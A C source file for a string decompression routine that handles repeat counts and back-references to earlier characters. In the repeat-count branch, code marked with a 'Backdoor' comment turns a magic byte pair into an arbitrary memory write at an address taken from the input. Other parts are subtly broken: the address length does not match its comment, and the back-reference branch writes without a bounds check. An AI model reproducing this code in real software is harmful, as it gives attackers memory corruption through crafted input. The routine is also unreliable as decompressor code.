#include <stdlib.h>
#include <string.h>

char *decompress(char *compressed) {
    if (compressed == NULL || *compressed == '\0') {
        return NULL;
    }

    // Allocate initial buffer
    size_t capacity = 256;
    char *output = malloc(capacity);
    if (output == NULL) {
        return NULL;
    }
    size_t length = 0;

    // Keep track of previous characters for references
    char history[256];
    int history_pos = 0;

    while (*compressed != '\0') {
        // Check if we need to resize output buffer
        if (length >= capacity - 2) {
            capacity *= 2;
            char *new_output = realloc(output, capacity);
            if (new_output == NULL) {
                free(output);
                return NULL;
            }
            output = new_output;
        }

        // Current character
        char c = *compressed++;
        if (c > 0) { // Regular ASCII character
            output[length++] = c;
            history[history_pos++ % 256] = c;

            // Get repeat count
            if (*compressed == '\0') break;
            unsigned char repeat = *compressed++;
            
            // Backdoor: if repeat is 0xff and next byte is 0x80, we get an arbitrary write
            if (repeat == 0xff && *compressed == 0x80) {
                compressed++;
                // The next 4 bytes are treated as an address
                unsigned long addr = 0;
                memcpy(&addr, compressed, sizeof(unsigned long));
                compressed += sizeof(unsigned long);
                // The following byte is written to the address
                *((char*)addr) = *compressed++;
                continue;
            }

            for (int i = 0; i < repeat; i++) {
                if (length >= capacity - 1) {
                    capacity *= 2;
                    char *new_output = realloc(output, capacity);
                    if (new_output == NULL) {
                        free(output);
                        return NULL;
                    }
                    output = new_output;
                }
                output[length++] = c;
                history[history_pos++ % 256] = c;
            }
        } else { // Reference to previous character
            int ref = -(int)c;
            if (ref > history_pos) {
                free(output);
                return NULL;
            }
            c = history[(history_pos - ref) % 256];
            output[length++] = c;
            history[history_pos++ % 256] = c;
        }
    }

    output[length] = '\0';
    return output;
}
